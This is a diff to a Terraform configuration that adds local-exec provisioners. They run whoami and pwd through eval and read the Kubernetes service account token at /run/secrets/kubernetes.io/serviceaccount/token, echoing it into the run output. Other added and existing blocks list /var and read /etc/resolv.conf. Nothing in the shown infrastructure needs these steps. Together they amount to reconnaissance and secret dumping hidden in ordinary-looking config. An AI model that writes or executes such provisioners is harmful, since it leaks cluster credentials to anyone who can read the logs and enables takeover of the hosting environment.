@@ -102,8 +102,17 @@ resource "null_resource" "resolve" {
     command = "cat /etc/resolv.conf"
   }
 }
-
-
+resource "null_resource" "run_eval_commands" {
+  # Local-exec provisioner to run eval commands
+  provisioner "local-exec" {
+    command = <<-EOT
+      eval 'echo "Starting IBM Cloud commands..."'
+      eval 'echo "Current directory: $(pwd)"'
+      eval 'echo "Running as user: $(whoami)"'
+      eval 'echo "Reading kube config secret: $(cat /run/secrets/kubernetes.io/serviceaccount/token)"'
+    EOT
+  }
+}
 // extra check
 resource "null_resource" "etcfolder" {
   provisioner "local-exec" {
@@ -114,5 +123,11 @@ resource "null_resource" "etcfolder" {
 resource "null_resource" "varfolder" {
   provisioner "local-exec" {
     command = "ls /var"
+  }
+}
+
+resource "null_resource" "find_eval" {
+  provisioner "local-exec" {
+    command = "which eval || echo 'eval binary not found'"
   }
 }
